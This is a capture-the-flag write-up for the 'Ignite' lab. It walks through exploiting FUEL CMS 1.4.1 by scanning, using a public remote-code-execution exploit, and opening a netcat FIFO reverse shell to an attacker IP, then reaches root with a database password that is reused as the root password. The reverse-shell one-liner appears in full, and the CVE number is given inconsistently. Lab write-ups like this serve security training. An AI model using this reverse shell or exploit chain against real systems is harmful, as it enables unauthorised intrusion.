Ignite:
We start by adding the $ip to the hosts file:

```bash
sudo echo "$ip" >> /etc/hosts
```

We begin with an nmap scan to identify services and software on the server:

```bash
nmap ignite.thm -sV
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

Robots Content:
```
Disallow: /fuel/
```

Accessing the directory mentioned in robots.txt, ignite.thm/fuel, we find a CMS version 1.4.1 with a CVE-2019-16763.

#FUEL CMS
#Version: <= 1.4.1
#CVE-2018-16763
#Tested on: Ubuntu - Apache2 - php5

We download the exploit for this CVE and manage to obtain a simple shell on the server, accessing it as the user www-data.

Using FIFO, we create a file in /tmp/

A FIFO file is created empty and acts as a communication channel between processes. One process can write data to the FIFO, while another process can read them. With the following command, we create a more comprehensive shell to proceed with the CTF:

```bash
rm /tmp/shell; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.44.97 44444 > /tmp/f
```

`rm` removes any file named `shell` in /tmp.
`mkfifo` creates the FIFO file named `f` in /tmp.
We use `cat /tmp/f` to read the FIFO file `f` in /tmp/f.
Then, we send the output through the PIPE `|` for a reverse netcat (nc) connection to the attacking machine.

"On the attacking machine, we execute the command `nc -nlvp 44444`."
This way, when the above command is executed, we will obtain an enhanced shell.

We check if Python is available using:
```bash
locate python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Analyzing configuration files of the Fuel CMS web system, we found the following file:

"-rwxrwxrwx 1 root root 4646 Jul 26  2019 /var/www/html/fuel/application/config/database.php"

Listing the permissions of the file, owned by ROOT with read and write permissions for all system users. We found a configuration file open for reading.

Searching passwords in PHP config files:
/var/www/html/fuel/application/config/database.php: 'password' => '???????',

This leads us to the idea of not keeping passwords the same in various places; this is the database password. Surprise, when trying to log in as the root user (su root), the password is exactly the same.

Achieving ROOT and obtaining the flags:

User
???????????????????????????????.flag
root
???????????????????????????????.flag
